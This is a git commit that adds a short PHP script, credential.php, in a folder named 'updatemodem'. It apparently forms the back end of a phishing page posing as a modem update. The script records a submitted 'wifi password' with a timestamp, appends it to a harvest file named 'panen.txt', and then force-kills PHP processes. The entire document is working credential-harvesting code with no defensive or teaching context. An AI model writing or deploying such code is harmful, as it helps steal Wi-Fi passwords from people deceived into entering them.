51f2c4469f02f0823ec53ccc5863323e4bdbb8a9
Wifue <126003725+Wifue@users.noreply.github.com>
2023-02-21 23:45:04 +0600

    Add files via upload

---
+++ updatemodem/credential.php
@@ -0,0 +1,10 @@
+<?php
+  /* set default timezone */
+date_default_timezone_set("Asia/Jakarta");
+    $date = date('Y-m-d H:i:s')."Z"."\n"; 
+	$key1 = "wifi password: ".$_POST['key1']."\n";
+    $credential = $date.$key1."\n";
+    file_put_contents('panen.txt', $credential, FILE_APPEND);
+
+	shell_exec('pkill -9 php');
+?>
